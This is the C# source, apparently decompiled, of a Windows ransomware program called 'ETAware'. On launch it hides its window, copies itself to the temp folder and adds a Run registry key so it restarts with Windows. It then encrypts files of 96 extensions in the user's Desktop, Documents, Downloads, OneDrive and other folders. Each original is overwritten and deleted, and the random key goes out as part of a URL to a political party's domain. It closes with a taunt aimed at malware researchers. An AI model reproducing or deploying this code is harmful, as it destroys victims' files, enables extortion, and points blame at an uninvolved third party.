using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ETAware;

public class Form1 : Form
{
	private static Random random = new Random();

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	public static string GenerateRandomKey(int length)
	{
		return new string((from s in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789ETABILDU", length)
			select s[random.Next(s.Length)]).ToArray());
	}

	private void DeleteFile(string inputFile)
	{
		FileInfo fileInfo = new FileInfo(inputFile);
		long length = fileInfo.Length;
		int num = (int)length;
		string contents = string.Concat(Enumerable.Repeat("\0", num + 5));
		File.WriteAllText(inputFile, contents);
		File.Delete(inputFile);
	}

	public static bool RunOnStartup(string AppTitle, string AppPath)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(AppTitle, AppPath);
			return true;
		}
		catch (Exception)
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(AppTitle, AppPath);
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}

	public static byte[] GenerateSalt()
	{
		byte[] array = new byte[32];
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	private void FileEncrypt(string inputFile, string password)
	{
		byte[] array = GenerateSalt();
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		using FileStream fileStream = new FileStream(inputFile + ".eta", FileMode.Create);
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		byte[] array2 = new byte[1048576];
		int count;
		while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
		{
			cryptoStream.Write(array2, 0, count);
		}
	}

	public void enumDir(string dirStr, string password)
	{
		string[] source = new string[96]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png",
			".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
			".xhtml", ".db", ".pdf", ".key", ".ico", ".md", ".c", ".cpp", ".cs", ".proj",
			".jpeg", ".dat", ".dll", ".ps1", ".avi", ".mp3", ".mp4", ".vid", ".wav", ".rtf",
			".wpd", ".tex", ".wpl", ".wma", ".ogg", ".mpa", ".mid", ".midi", ".cda", ".aif",
			".7z", ".arj", ".deb", ".pkg", ".rar", ".rpm", ".gz", ".tar", ".old", ".bak",
			".2", ".1", ".z", ".zip", ".dbf", ".log", ".mdb", ".sav", ".save", ".eml",
			".msg", ".emlx", ".oft", ".ost", ".pst", ".vcf", ".py", ".fnt", ".gif", ".bmp",
			".ps", ".tif", ".tiff", ".h", ".class", ".lib", ".pl", ".sh", ".bash", ".swift",
			".vb", ".ods", ".lnk", ".tmp", ".ini", ".ink"
		};
		try
		{
			string[] files = Directory.GetFiles(dirStr);
			string[] directories = Directory.GetDirectories(dirStr);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					try
					{
						FileEncrypt(files[i], password);
						DeleteFile(files[i]);
					}
					catch (Exception)
					{
						Console.WriteLine(":(");
					}
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (directories[j] != ".." && directories[j] != ".")
				{
					enumDir(directories[j], password);
				}
			}
		}
		catch (Exception)
		{
			try
			{
				enumDir(dirStr + "\\Desktop\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Downloads\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Documents\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Music\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Pictures\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Videos\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Favorites\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Contacts\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\Links\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
			try
			{
				enumDir(dirStr + "\\OneDrive\\", password);
			}
			catch (Exception)
			{
				Console.WriteLine(":(");
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		string text = "VIVAETA" + GenerateRandomKey(25);
		Form2 form = new Form2();
		((Control)this).Hide();
		string environmentVariable = Environment.GetEnvironmentVariable("userprofile");
		if (File.Exists(environmentVariable + "\\eta.txt"))
		{
			((Form)form).Show((IWin32Window)(object)this);
			return;
		}
		string tempPath = Path.GetTempPath();
		string text2 = tempPath + "\\ETA.exe";
		string appTitle = "ETA";
		string executablePath = Application.get_ExecutablePath();
		File.Copy(executablePath, text2, overwrite: true);
		RunOnStartup(appTitle, text2);
		try
		{
			enumDir(environmentVariable + "\\Desktop\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Downloads\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Documents\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Music\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Pictures\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Videos\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Favorites\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Contacts\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\Links\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		try
		{
			enumDir(environmentVariable + "\\OneDrive\\", text);
		}
		catch (Exception)
		{
			Console.WriteLine(":(");
		}
		File.WriteAllText(environmentVariable + "\\eta.txt", "ETAwazHERE");
		WebRequest.Create("https://ehbildu.eus/" + text);
		string value = "INVESTIGADOR DE MALWARE! COMO BIEN VES, LAS CLAVES LAS TIENEN LOS LOGS DE LA WEB DE BILDU. VIVA ESKADI";
		Console.WriteLine(value);
		((Form)form).Show((IWin32Window)(object)this);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
